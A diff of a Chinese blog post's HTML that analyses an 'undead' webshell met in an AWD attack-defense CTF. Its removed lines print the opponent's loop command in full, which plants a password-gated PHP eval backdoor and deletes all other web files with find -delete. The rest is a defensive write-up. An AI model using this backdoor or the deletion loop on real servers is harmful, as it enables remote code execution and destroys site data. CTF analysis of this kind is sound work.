@@ -18,12 +18,12 @@
   
   
   <title>AWD不死马分析 | Polo&#39;s Blog</title>
-  <meta name="description" content="前言最近在练习AWD的时候遇到了一个很棘手的不死马，功能主要就是删站，于是本文对该不死马进行分析并寻找对策。 场景一 :先手不死马权限维持对手不死马内容如下： 123sh -c while true;do echo &amp;#x27;&lt;?php $key&#x3D;$_POST[&quot;key&quot;];$keyhash&#x3D;md5($key);if($keyhash&#x3D;&#x3D;&#x3D;&quot;ce3abf96f">
+  <meta name="description" content="前言最近在练习AWD的时候遇到了一个很棘手的不死马，功能主要就是删站，于是本文对该不死马进行分析并寻找对策。 场景一 :先手不死马权限维持对手不死马会在网站根目录下循环生成.xxxxxx.php名称的webshell，同时会循环删除除自身以外的其它所有网站目录及文件。 首先给自己服务器www-data权限在web根目录上个不死马  但是这里有个问题，直接访问shell是404，除了game路由和i">
 <meta property="og:type" content="article">
 <meta property="og:title" content="AWD不死马分析">
 <meta property="og:url" content="https://polosec.github.io/2023/07/01/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="Polo&#39;s Blog">
-<meta property="og:description" content="前言最近在练习AWD的时候遇到了一个很棘手的不死马，功能主要就是删站，于是本文对该不死马进行分析并寻找对策。 场景一 :先手不死马权限维持对手不死马内容如下： 123sh -c while true;do echo &amp;#x27;&lt;?php $key&#x3D;$_POST[&quot;key&quot;];$keyhash&#x3D;md5($key);if($keyhash&#x3D;&#x3D;&#x3D;&quot;ce3abf96f">
+<meta property="og:description" content="前言最近在练习AWD的时候遇到了一个很棘手的不死马，功能主要就是删站，于是本文对该不死马进行分析并寻找对策。 场景一 :先手不死马权限维持对手不死马会在网站根目录下循环生成.xxxxxx.php名称的webshell，同时会循环删除除自身以外的其它所有网站目录及文件。 首先给自己服务器www-data权限在web根目录上个不死马  但是这里有个问题，直接访问shell是404，除了game路由和i">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://cdn.polowong.top/image-20230701182147014.png">
 <meta property="og:image" content="http://cdn.polowong.top/image-20230701185159366.png">
@@ -31,7 +31,7 @@
 <meta property="og:image" content="http://cdn.polowong.top/image-20230701190316490.png">
 <meta property="og:image" content="http://cdn.polowong.top/image-20230701192308062.png">
 <meta property="article:published_time" content="2023-07-01T12:16:14.000Z">
-<meta property="article:modified_time" content="2023-07-01T12:16:17.173Z">
+<meta property="article:modified_time" content="2023-07-02T04:04:20.173Z">
 <meta property="article:author" content="Polo">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://cdn.polowong.top/image-20230701182147014.png">
@@ -331,10 +331,10 @@
         <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/07/01/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC%E5%88%86%E6%9E%90/#comments" class="article-comment-link">Comments</a></span>
         
 	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 1k(words)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 893(words)</span>
 	
 	
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 5(minutes)</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 4(minutes)</span>
 	
 
       </div>
@@ -342,11 +342,7 @@
     <div class="article-entry marked-body" itemprop="articleBody">
       
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在练习AWD的时候遇到了一个很棘手的不死马，功能主要就是删站，于是本文对该不死马进行分析并寻找对策。</p>
-<h1 id="场景一-先手不死马权限维持"><a href="#场景一-先手不死马权限维持" class="headerlink" title="场景一 :先手不死马权限维持"></a>场景一 :先手不死马权限维持</h1><p>对手不死马内容如下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh -c while true;do echo &#x27;&lt;?php $key=$_POST[&quot;key&quot;];$keyhash=md5($key);if($keyhash===&quot;ce3abf96f10611c4b801d70568d200a6&quot;) &#123;eval($_POST[&quot;a&quot;]);&#125;echo&quot;file not find.&quot;; ?&gt;&#x27; &gt; /var/www/html/.edd300324dab8fa4799151d7c11952c4.php;find /var/www/html -not -name &quot;.edd300324dab8fa4799151d7c11952c4.php&quot; -not -name &quot;rsa.php&quot; -delete;chmod 700 /var/www/html/.edd300324dab8fa4799151d7c11952c4.php;chmod 700 /tmp/g;sleep 1;done;</span><br><span class="line">sh -c &#x27;while true; do &#123; echo &quot;&lt;?php $key=$_POST[\&quot;key\&quot;];$keyhash=md5($key);if($keyhash===\&quot;ce3abf96f10611c4b801d70568d200a6\&quot;) &#123;eval($_POST[\&quot;a\&quot;]);&#125; echo \&quot;file not find.\&quot;; ?&gt;&quot; &gt; /var/www/html/.edd300324dab8fa4799151d7c11952c4.php; find /var/www/html -not -name \&quot;.edd300324dab8fa4799151d7c11952c4.php\&quot; -not -name \&quot;rsa.php\&quot; -delete; chmod 700 /var/www/html/.edd300324dab8fa4799151d7c11952c4.php; chmod 700 /tmp/g; sleep 1; &#125; done;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
+<h1 id="场景一-先手不死马权限维持"><a href="#场景一-先手不死马权限维持" class="headerlink" title="场景一 :先手不死马权限维持"></a>场景一 :先手不死马权限维持</h1><p>对手不死马会在网站根目录下循环生成.xxxxxx.php名称的webshell，同时会循环删除除自身以外的其它所有网站目录及文件。</p>
 <p>首先给自己服务器www-data权限在web根目录上个不死马</p>
 <p><img src="http://cdn.polowong.top/image-20230701182147014.png" alt="image-20230701182147014"></p>
 <p>但是这里有个问题，直接访问shell是404，除了game路由和index其他任何文件/目录访问都是404，第一反应可能是apache配置问题，但是apache配置在AWD环境中无法修改，感觉要考虑htaccess问题。htaccess代码如下：</p>
